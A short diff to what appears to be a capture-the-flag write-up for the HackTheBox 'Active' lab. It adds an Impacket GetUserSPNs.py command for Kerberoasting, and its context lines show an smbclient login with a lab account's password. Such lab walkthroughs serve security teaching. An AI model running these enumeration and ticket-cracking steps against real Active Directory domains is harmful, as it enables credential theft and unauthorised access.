@@ -132,6 +132,9 @@ smbclient //10.129.207.36/Users -U 'active.htb\SVC_TGS%GPPstillStandingStrong2k1
 *With a valid low-privileged domain account, check if any Domain Admin or high-value accounts have Service Principal Names (SPNs) attached to them. If they do, you can request their Kerberos tickets and crack them offline.*
 
 ```bash
+# Typical Impacket command (Check whether we can get TGS or not)
+GetUserSPNs.py active.htb/SVC_TGS:<password> -dc-ip 10.10.10.100
+
 # Use Impacket to find vulnerable accounts and extract the TGS hash in one command
 # Syntax: GetUserSPNs.py <domain>/<user>:<password> -dc-ip <DC_IP> -request
 
